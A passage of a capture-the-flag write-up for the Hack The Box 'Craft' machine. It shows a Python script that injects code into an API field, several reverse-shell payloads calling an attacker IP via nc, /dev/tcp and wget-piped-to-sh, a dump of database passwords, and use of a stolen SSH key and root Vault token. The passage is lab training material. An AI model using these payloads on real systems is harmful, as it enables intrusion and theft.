&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;https://api.craft.htb/api/auth/login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;dinesh&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;4aUh0A8PbVJxgd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;json_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;json_response&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;token&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;X-Craft-API-Token&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;  &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# make sure token is valid&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#response = requests.get(&amp;#39;https://api.craft.htb/api/auth/check&amp;#39;, headers=headers, verify=False, proxies=proxies)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;https://api.craft.htb/api/auth/check&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# create a sample brew with bogus ABV... should fail.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Create bogus ABV brew&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#brew_dict[&amp;#39;abv&amp;#39;] = &amp;#39;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.51/7777 0&amp;gt;&amp;amp;1&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#brew_dict[&amp;#39;abv&amp;#39;] = &amp;#39;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;wget 10.10.14.51:8081/$(ls ./lolll.sh)&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#brew_dict[&amp;#39;abv&amp;#39;] = &amp;#39;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;ncat 10.10.14.51 4444 -e /bin/sh &amp;amp;&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#brew_dict[&amp;#39;abv&amp;#39;] = &amp;#39;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;wget -O - 10.10.14.51:8081/shell.py | sh&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;abv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__import__(&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;os&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;).popen(&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;nc 10.10.14.194 7777 -e /bin/sh&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;).read()&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#brew_dict[&amp;#39;abv&amp;#39;] = &amp;#39;0.15&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;brewer&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;style&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;json_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dumps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;json_data&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;https://api.craft.htb/api/brew/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;json_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="api-reverse-shell"&gt;API: reverse shell&lt;/h2&gt;
&lt;p&gt;Once we get a relay on the box we notice that we are root… but in a docker.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat release_agent&lt;/span&gt;
&lt;span class="code-line"&gt;/var/lib/docker/overlay2/28e271a4328612a47294bbae8c8b7f01470e29454eef499b5beda147a55000e0/diff/c&lt;/span&gt;
&lt;span class="code-line"&gt;uname -a&lt;/span&gt;
&lt;span class="code-line"&gt;Linux 5a3d243127f5 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 Linux&lt;/span&gt;
&lt;span class="code-line"&gt;cat /proc/1/cgroup&lt;/span&gt;
&lt;span class="code-line"&gt;10:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
&lt;span class="code-line"&gt;9:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
&lt;span class="code-line"&gt;8:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
&lt;span class="code-line"&gt;7:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
&lt;span class="code-line"&gt;6:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
&lt;span class="code-line"&gt;5:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
&lt;span class="code-line"&gt;4:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
&lt;span class="code-line"&gt;3:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
&lt;span class="code-line"&gt;2:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
&lt;span class="code-line"&gt;1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="mysql"&gt;MySQL&lt;/h2&gt;
&lt;p&gt;We explorer the application folder and found some database settings.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat craft_api/settings.py&lt;/span&gt;
&lt;span class="code-line"&gt;# Flask settings&lt;/span&gt;
&lt;span class="code-line"&gt;FLASK_SERVER_NAME = &amp;#39;api.craft.htb&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;FLASK_DEBUG = False  # Do not use debug mode in production&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Flask-Restplus settings&lt;/span&gt;
&lt;span class="code-line"&gt;RESTPLUS_SWAGGER_UI_DOC_EXPANSION = &amp;#39;list&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;RESTPLUS_VALIDATE = True&lt;/span&gt;
&lt;span class="code-line"&gt;RESTPLUS_MASK_SWAGGER = False&lt;/span&gt;
&lt;span class="code-line"&gt;RESTPLUS_ERROR_404_HELP = False&lt;/span&gt;
&lt;span class="code-line"&gt;CRAFT_API_SECRET = &amp;#39;hz66OCkDtv8G6D&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# database&lt;/span&gt;
&lt;span class="code-line"&gt;MYSQL_DATABASE_USER = &amp;#39;craft&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;MYSQL_DATABASE_PASSWORD = &amp;#39;qLGockJ6G2J75O&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;MYSQL_DATABASE_DB = &amp;#39;craft&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;MYSQL_DATABASE_HOST = &amp;#39;db&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;SQLALCHEMY_TRACK_MODIFICATIONS = False&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In order to have a "better" shell we can use &lt;code&gt;/bin/sh -i&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;There is a &lt;code&gt;dbtest.py&lt;/code&gt; script that allow us to test the connection to the
database. We cat that script in a new one in order to change the SQL line to
list the &lt;code&gt;users&lt;/code&gt;'s table. At first I tried with a &lt;code&gt;from users&lt;/code&gt;. As there was no
result I tried with the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/opt/app # head -n 15 dbtest.py &amp;gt; dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;/opt/app # echo &amp;#39;        sql = &amp;quot;SELECT * from user&amp;quot;&amp;#39; &amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;/opt/app # echo &amp;#39;        sql = &amp;quot;SELECT * from user&amp;quot;&amp;#39; &amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;/opt/app # tail -n 6 dbtest.py &amp;gt;&amp;gt; dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;/opt/app # python dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;#39;id&amp;#39;: 1, &amp;#39;username&amp;#39;: &amp;#39;dinesh&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;4aUh0A8PbVJxgd&amp;#39;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We get only one user because the &lt;code&gt;dbtest.py&lt;/code&gt; script use the &lt;code&gt;cursor.fetchone()&lt;/code&gt; function.
The &lt;code&gt;pymysql&lt;/code&gt; &lt;a href="https://pymysql.readthedocs.io/en/latest/modules/cursors.html"&gt;documentation&lt;/a&gt;
indicate that we want to use the &lt;code&gt;cursor.fetchall()&lt;/code&gt; function. We modify our
"script":&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/opt/app # head -n 15 dbtest.py &amp;gt; dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;/opt/app # echo &amp;#39;        sql = &amp;quot;SELECT * from user&amp;quot;&amp;#39; &amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;/opt/app # echo &amp;#39;        cursor.execute(sql)&amp;#39;&amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;/opt/app # echo &amp;#39;        result = cursor.fetchall()&amp;#39;&amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;/opt/app # tail -n 4 dbtest.py &amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;/opt/app # python dbtest2.py&lt;/span&gt;
&lt;span class="code-line"&gt;[{&amp;#39;id&amp;#39;: 1, &amp;#39;username&amp;#39;: &amp;#39;dinesh&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;4aUh0A8PbVJxgd&amp;#39;}, {&amp;#39;id&amp;#39;: 4, &amp;#39;username&amp;#39;: &amp;#39;ebachman&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;llJ77D8QFkLPQB&amp;#39;}, {&amp;#39;id&amp;#39;: 5, &amp;#39;username&amp;#39;: &amp;#39;gilfoyle&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;ZEU3N8WNM2rh4T&amp;#39;}]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then connect to the GOGS with the &lt;code&gt;gilfoyle&lt;/code&gt; credentials.&lt;/p&gt;
&lt;p&gt;This user has a private repository containing sensitive information as his private
SSH key. The key is protected by a passphrase. That passhrase is his password!
We need to copy his private and public key in our &lt;code&gt;.ssh&lt;/code&gt; folder. We also need to
change the private key permission (&lt;code&gt;chmod 600&lt;/code&gt;). We can then SSH to the machine
and get the user flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh craft.htb -l gilfoyle&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  .   *   ..  . *  *&lt;/span&gt;
&lt;span class="code-line"&gt;*  * @()Ooc()*   o  .&lt;/span&gt;
&lt;span class="code-line"&gt;    (Q@*0CG*O()  ___&lt;/span&gt;
&lt;span class="code-line"&gt;  |\_________/|/ _ \&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | / | |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  | \_| |&lt;/span&gt;
&lt;span class="code-line"&gt;  |  |  |  |  |\___/&lt;/span&gt;
&lt;span class="code-line"&gt;  |\_|__|__|_/|&lt;/span&gt;
&lt;span class="code-line"&gt;    \_________/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;/root/.ssh/id_rsa&amp;#39;:&lt;/span&gt;
&lt;span class="code-line"&gt;Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;The programs included with the Debian GNU/Linux system are free software;&lt;/span&gt;
&lt;span class="code-line"&gt;the exact distribution terms for each program are described in the&lt;/span&gt;
&lt;span class="code-line"&gt;individual files in /usr/share/doc/*/copyright.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&lt;/span&gt;
&lt;span class="code-line"&gt;permitted by applicable law.&lt;/span&gt;
&lt;span class="code-line"&gt;gilfoyle@craft:~$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;gilfoyle@craft:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;bbf4b&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;getting root&lt;/h1&gt;
&lt;h2 id="enumeration"&gt;enumeration&lt;/h2&gt;
&lt;p&gt;When listing the &lt;code&gt;gilfoyle&lt;/code&gt; home folder we found a &lt;code&gt;.vault-token&lt;/code&gt; file
containing a &lt;a href="https://www.vaultproject.io/"&gt;vault&lt;/a&gt; token.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gilfoyle@craft:~$ ls -al&lt;/span&gt;
&lt;span class="code-line"&gt;total 36&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 .&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh&lt;/span&gt;
&lt;span class="code-line"&gt;-r-------- 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token&lt;/span&gt;
&lt;span class="code-line"&gt;-rw------- 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo&lt;/span&gt;
&lt;span class="code-line"&gt;gilfoyle@craft:~$ cat .vault-token&lt;/span&gt;
&lt;span class="code-line"&gt;f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="vault"&gt;Vault&lt;/h2&gt;
&lt;p&gt;In order to use vault, when need to authenticate ourself with the token.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gilfoyle@craft:~$ vault login&lt;/span&gt;
&lt;span class="code-line"&gt;Token (will be hidden):&lt;/span&gt;
&lt;span class="code-line"&gt;Success! You are now authenticated. The token information displayed below&lt;/span&gt;
&lt;span class="code-line"&gt;is already stored in the token helper. You do NOT need to run &amp;quot;vault login&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;again. Future Vault requests will automatically use this token.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Key                  Value&lt;/span&gt;
&lt;span class="code-line"&gt;---                  -----&lt;/span&gt;
&lt;span class="code-line"&gt;token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9&lt;/span&gt;
&lt;span class="code-line"&gt;token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103&lt;/span&gt;
&lt;span class="code-line"&gt;token_duration       ∞&lt;/span&gt;
&lt;span class="code-line"&gt;token_renewable      false&lt;/span&gt;
&lt;span class="code-line"&gt;token_policies       [&amp;quot;root&amp;quot;]&lt;/span&gt;
&lt;span class="code-line"&gt;identity_policies    []&lt;/span&gt;
&lt;span class="code-line"&gt;policies             [&amp;quot;root&amp;quot;]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We are member of the vault's
&lt;a href="https://www.vaultproject.io/docs/concepts/policies.html#root-policy"&gt;root policy&lt;/a&gt;
meaning that we can access everything stored on the vault.&lt;/p&gt;
&lt;p&gt;The vault is unsealed. Therefore we can directly access to the data. If this vault
was sealed we will need 3 of the 5 keys to unsealed
the vault (with the &lt;em&gt;shamir&lt;/em&gt; seal type).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gilfoyle@craft:~$ vault status&lt;/span&gt;
&lt;span class="code-line"&gt;Key             Value&lt;/span&gt;
&lt;span class="code-line"&gt;---             -----&lt;/span&gt;
&lt;span class="code-line"&gt;Seal Type       shamir&lt;/span&gt;
&lt;span class="code-line"&gt;Initialized     false&lt;/span&gt;
&lt;span class="code-line"&gt;Sealed          false&lt;/span&gt;
&lt;span class="code-line"&gt;Total Shares    5&lt;/span&gt;
&lt;span class="code-line"&gt;Threshold       3&lt;/span&gt;
&lt;span class="code-line"&gt;Version         0.11.1&lt;/span&gt;
&lt;span class="code-line"&gt;Cluster Name    vault-cluster-cb7e66f9&lt;/span&gt;
&lt;span class="code-line"&gt;Cluster ID      8bb98351-0148-3c42-d124-45a87dc43db7&lt;/span&gt;
&lt;span class="code-line"&gt;HA Enabled      false&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can list the secret engine enable on the vault.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gilfoyle@craft:~$ vault secrets list&lt;/span&gt;
&lt;span class="code-line"&gt;Path          Type         Accessor              Description&lt;/span&gt;
&lt;span class="code-line"&gt;----          ----         --------              -----------&lt;/span&gt;
&lt;span class="code-line"&gt;cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage&lt;/span&gt;
&lt;span class="code-line"&gt;identity/     identity     identity_56533c34     identity store&lt;/span&gt;
&lt;span class="code-line"&gt;secret/       kv           kv_2d9b0109           key/value secret storage&lt;/span&gt;
&lt;span class="code-line"&gt;ssh/          ssh          ssh_3bbd5276          n/a&lt;/span&gt;
&lt;span class="code-line"&gt;sys/          system       system_477ec595       system endpoints used for control, policy and debugging&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In the &lt;code&gt;craf-infra&lt;/code&gt; repository there is a &lt;code&gt;vault&lt;/code&gt; folder containing a
&lt;code&gt;secret.sh&lt;/code&gt; file. This file show wich secrets are created: An ssh acces for the
root user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;craft-infra/vault# cat secrets.sh&lt;/span&gt;
&lt;span class="code-line"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# set up vault secrets backend&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;vault secrets enable ssh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
